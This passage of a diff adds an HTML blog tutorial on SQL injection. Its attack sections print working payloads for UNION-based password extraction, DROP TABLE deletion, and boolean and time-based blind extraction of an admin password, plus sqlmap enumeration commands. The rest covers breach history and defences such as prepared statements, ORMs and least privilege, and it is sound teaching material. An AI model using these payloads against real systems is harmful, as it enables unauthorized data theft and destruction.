+    <pre><code>// Attacker enters: username = "' UNION SELECT username, password FROM users --"
+// Generated query:
+SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users --'
+// UNION combines results — attacker gets all users and passwords!</code></pre>
+
+    <h3>Step 4: Destructive attack</h3>
+    <pre><code>// Attacker enters: username = "'; DROP TABLE users; --"
+// Generated query:
+SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
+// Result: the ENTIRE users table is deleted!</code></pre>
+
+    <div class="callout callout-danger">
+      <strong>IMPORTANT:</strong> These examples are for educational purposes only. Performing SQL Injection attacks on systems without authorization is a criminal offense.
+    </div>
+
+    <h2 id="sql-types">3. Types of SQL Injection attacks</h2>
+    <table>
+      <tr><th>Type</th><th>Description</th><th>Detection difficulty</th><th>Danger</th></tr>
+      <tr><td>Classic (In-band)</td><td>Attack result is visible on the page</td><td>Easy</td><td>High</td></tr>
+      <tr><td>Error-based</td><td>Uses SQL error messages for data extraction</td><td>Easy</td><td>High</td></tr>
+      <tr><td>UNION-based</td><td>Uses UNION operator to combine queries</td><td>Medium</td><td>High</td></tr>
+      <tr><td>Blind Boolean</td><td>Discovers data through true/false responses</td><td>Hard</td><td>High</td></tr>
+      <tr><td>Blind Time-based</td><td>Uses SLEEP/WAITFOR for detection</td><td>Hard</td><td>High</td></tr>
+      <tr><td>Out-of-Band</td><td>Data sent to attacker's server (DNS, HTTP)</td><td>Very hard</td><td>High</td></tr>
+    </table>
+
+    <h3>Classic (In-band) SQL Injection</h3>
+    <p>The simplest type — the attacker sees the query results directly on the page. Includes Error-based (using SQL errors) and UNION-based (combining results).</p>
+    <pre><code>// Error-based — extracting database version
+' AND 1=CONVERT(int, @@version) --
+// Error: Conversion failed... "Microsoft SQL Server 2019..."
+
+// UNION-based — extracting tables
+' UNION SELECT table_name, NULL FROM information_schema.tables --</code></pre>
+
+    <h3>Blind SQL Injection — Boolean-based</h3>
+    <p>When the server does not display SQL errors, the attacker discovers data by asking true/false questions:</p>
+    <pre><code>// Is the first character of admin password 'a'?
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+// If page works normally = TRUE (character is 'a')
+// If page shows error = FALSE (character is not 'a')
+
+// Attacker repeats for each character — slow but effective
+// Automation: SQLMap does this automatically</code></pre>
+
+    <h3>Blind SQL Injection — Time-based</h3>
+    <p>When the server gives no difference in response, the attacker uses delay for detection:</p>
+    <pre><code>// MySQL
+' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
+// If response delays 5 seconds = TRUE
+// If response is immediate = FALSE
+
+// SQL Server
+'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '00:00:05' --</code></pre>
+
+    <h2 id="sql-real">4. Real-world attack examples</h2>
+
+    <h3>Heartland Payment Systems (2008)</h3>
+    <p>Albert Gonzalez and his team used SQL Injection to compromise Heartland Payment Systems, one of the largest card transaction processors in the US. The attack resulted in the theft of <strong>130 million</strong> credit and debit card numbers — at the time the largest data theft in history. Gonzalez was sentenced to 20 years in prison.</p>
+
+    <h3>Sony Pictures (2011)</h3>
+    <p>The hacker group LulzSec exploited an SQL Injection vulnerability on the Sony Pictures site and compromised <strong>77 million</strong> user accounts on the PlayStation Network. The data included names, addresses, email addresses, and passwords (which were stored in plain text, without hashing). Sony had to shut down PSN for 23 days and estimated damage exceeded $171 million.</p>
+
+    <h3>Equifax (2017)</h3>
+    <p>While the Equifax attack primarily used an Apache Struts vulnerability (CVE-2017-5638), SQL Injection was part of the attack chain for data extraction. <strong>147 million</strong> user records were compromised including Social Security numbers, birth dates, and addresses. Equifax paid <strong>$700 million</strong> in a settlement with the FTC, the largest data breach fine in US history.</p>
+
+    <h3>TalkTalk (2015)</h3>
+    <p>British telecom provider TalkTalk was hacked via SQL Injection. <strong>157,000</strong> user accounts were compromised. TalkTalk was fined 400,000 pounds by the ICO. Interestingly, the attacker was a 17-year-old.</p>
+
+    <h2 id="sql-cons">5. Consequences of SQL Injection</h2>
+    <ul>
+      <li><strong>Unauthorized database access</strong> — Reading all tables, including user data, passwords, financial information</li>
+      <li><strong>Data modification</strong> — Changing prices, modifying user accounts, adding admin access</li>
+      <li><strong>Data deletion</strong> — DROP TABLE, DELETE FROM — complete data loss</li>
+      <li><strong>Privilege escalation</strong> — Adding admin accounts, gaining access you should not have</li>
+      <li><strong>OS command execution</strong> — On some DB systems (SQL Server with xp_cmdshell) the attacker can execute commands on the server</li>
+      <li><strong>Lateral movement</strong> — Using the DB server as a stepping stone to attack internal systems</li>
+      <li><strong>Financial damage</strong> — Fines (GDPR, FTC), legal costs, customer loss</li>
+      <li><strong>Reputational damage</strong> — Loss of trust from users and business partners</li>
+    </ul>
+
+    <h2 id="sql-prep">6. Protection: Prepared Statements (Parameterized Queries)</h2>
+    <p>Prepared statements are the <strong>most effective</strong> protection against SQL Injection. The principle is simple: separate SQL code from data. The database treats parameters exclusively as values, never as part of SQL code.</p>
+
+    <h3>PHP — PDO</h3>
+    <pre><code>// VULNERABLE — concatenation
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+
+// SAFE — PDO prepared statement
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
+$stmt->execute([
+    ':username' => $username,
+    ':password' => $password
+]);
+$user = $stmt->fetch();</code></pre>
+
+    <h3>Python — sqlite3 / psycopg2</h3>
+    <pre><code># VULNERABLE
+cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
+
+# SAFE — parameterized query
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))</code></pre>
+
+    <h3>Java — JDBC</h3>
+    <pre><code>// VULNERABLE
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+
+// SAFE — PreparedStatement
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();</code></pre>
+
+    <h3>Node.js — mysql2 / pg</h3>
+    <pre><code>// VULNERABLE
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+connection.query(query);
+
+// SAFE — mysql2
+const [rows] = await connection.execute(
+  'SELECT * FROM users WHERE username = ? AND password = ?',
+  [username, password]
+);
+
+// SAFE — pg (PostgreSQL)
+const result = await pool.query(
+  'SELECT * FROM users WHERE username = $1 AND password = $2',
+  [username, password]
+);</code></pre>
+
+    <div class="callout">
+      <strong>Why prepared statements work:</strong> The database compiles the SQL query WITHOUT user data, creating a fixed execution plan. Then user data is sent separately as parameters. Even if a parameter contains <code>' OR 1=1 --</code>, the database treats it as a literal string, not as SQL code.
+    </div>
+
+    <h2 id="sql-orme">7. Protection: ORM tools</h2>
+    <p>Object-Relational Mapping (ORM) tools automatically generate parameterized SQL queries, providing SQL Injection protection with better development productivity.</p>
+
+    <h3>Django ORM (Python)</h3>
+    <pre><code># SAFE — Django ORM automatically parameterizes
+user = User.objects.filter(username=username, password=password).first()
+
+# Also safe — lookups
+users = User.objects.filter(email__contains=search_term)
+
+# DANGEROUS — raw query without parameterization
+User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")  # NO!
+
+# SAFE — raw query WITH parameterization
+User.objects.raw("SELECT * FROM users WHERE username = %s", [username])</code></pre>
+
+    <h3>Prisma (Node.js / TypeScript)</h3>
+    <pre><code>// SAFE — Prisma automatically parameterizes
+const user = await prisma.user.findUnique({
+  where: {
+    username: username,
+  },
+});
+
+// SAFE — findMany with filters
+const users = await prisma.user.findMany({
+  where: {
+    email: { contains: searchTerm },
+  },
+});</code></pre>
+
+    <h3>Sequelize (Node.js)</h3>
+    <pre><code>// SAFE — Sequelize model query
+const user = await User.findOne({
+  where: { username: username, password: password }
+});
+
+// DANGEROUS — raw query
+sequelize.query(`SELECT * FROM users WHERE username = '${username}'`); // NO!
+
+// SAFE — raw query with parameters
+sequelize.query('SELECT * FROM users WHERE username = ?', {
+  replacements: [username],
+  type: QueryTypes.SELECT
+});</code></pre>
+
+    <h2 id="sql-valid">8. Protection: Input validation and Least Privilege</h2>
+
+    <h3>Input validation (additional layer)</h3>
+    <p>Input validation is <strong>not</strong> a replacement for prepared statements, but it is a useful additional layer of protection:</p>
+    <pre><code>// Whitelist for numeric IDs
+function validateId(input) {
+  var id = parseInt(input, 10);
+  if (isNaN(id) || id < 1) throw new Error('Invalid ID');
+  return id;
+}
+
+// Whitelist for sort columns
+var allowedColumns = ['name', 'email', 'created_at'];
+function validateSortColumn(input) {
+  if (!allowedColumns.includes(input)) throw new Error('Invalid column');
+  return input;
+}</code></pre>
+
+    <h3>Principle of Least Privilege</h3>
+    <p>Create separate DB users with minimal privileges:</p>
+    <pre><code>-- Read-only user (web application - most queries)
+CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT ON mydb.* TO 'app_readonly'@'localhost';
+
+-- Write user (when needed)
+CREATE USER 'app_write'@'localhost' IDENTIFIED BY 'strong_password';
+GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_write'@'localhost';
+-- NOTE: No DELETE, DROP, ALTER privileges!
+
+-- Never use root account for web applications!
+-- Never grant: DROP, ALTER, GRANT, FILE, PROCESS, SUPER</code></pre>
+
+    <div class="callout callout-warn">
+      <strong>WAF is not a replacement for prepared statements!</strong> A WAF can be bypassed with sufficiently sophisticated payloads (encoding, comments, alternative syntax). Use WAF as an additional layer, not as primary protection.
+    </div>
+
+    <h3>Testing with SQLMap</h3>
+    <p><a href="https://sqlmap.org/" target="_blank">SQLMap</a> is an open-source tool for automated SQL Injection testing and exploitation. Use it to test your own applications:</p>
+    <pre><code># Basic testing
+sqlmap -u "https://yoursite.com/page?id=1" --batch
+
+# Testing POST parameters
+sqlmap -u "https://yoursite.com/login" --data="username=test&password=test" --batch
+
+# Database enumeration
+sqlmap -u "https://yoursite.com/page?id=1" --dbs --batch
+
+# Table enumeration
+sqlmap -u "https://yoursite.com/page?id=1" -D mydb --tables --batch</code></pre>
+
+    <h3>Other testing tools</h3>
+    <ul>
+      <li><strong>OWASP ZAP</strong> — Open-source web security scanner with SQL Injection detection</li>
+      <li><strong>Burp Suite</strong> — Professional web security testing tool</li>
+      <li><strong>jSQL Injection</strong> — Java-based SQLi tool</li>
+    </ul>
+
+    <h2 id="sql-refs">10. References and resources</h2>
+    <ul>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP SQL Injection Prevention Cheat Sheet</a> — Complete protection guide</li>
+      <li><a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank">OWASP Top 10 — A03:2021 Injection</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: SQL Injection</a></li>
+      <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger — SQL Injection</a> — Interactive practice labs</li>
+      <li><a href="https://sqlmap.org/" target="_blank">SQLMap</a> — Automated SQL Injection tool</li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" target="_blank">OWASP Testing Guide — SQL Injection</a></li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Glossary/SQL_Injection" target="_blank">MDN — SQL Injection</a></li>
+    </ul>
+
+    <a href="./index.html" class="cta">Scan your site's security</a>
+  </div>
+
+  <div class="nav-links">
+    <a href="./blog-security-xss.html"><span class="sr">XSS napadi</span><span class="en">XSS Attacks</span></a>
+    <a href="./blog-security-headers.html"><span class="sr">HTTP Security Headers</span><span class="en">HTTP Security Headers</span></a>
+    <a href="./blog-security-ssl.html"><span class="sr">SSL/TLS vodic</span><span class="en">SSL/TLS Guide</span></a>
+    <a href="./blog-security-csrf.html"><span class="sr">CSRF napadi</span><span class="en">CSRF Attacks</span></a>
+    <a href="./blog-security-dns.html"><span class="sr">DNS bezbednost</span><span class="en">DNS Security</span></a>
+    <a href="./blog-security-ports.html"><span class="sr">Port skeniranje</span><span class="en">Port Scanning</span></a>
+    <a href="./blog-security-api.html"><span class="sr">API bezbednost</span><span class="en">API Security</span></a>
+  </div>
+
+  </main>
+</div>
+<script src="./blog-common.js" defer></script>
+</body>
+</html>
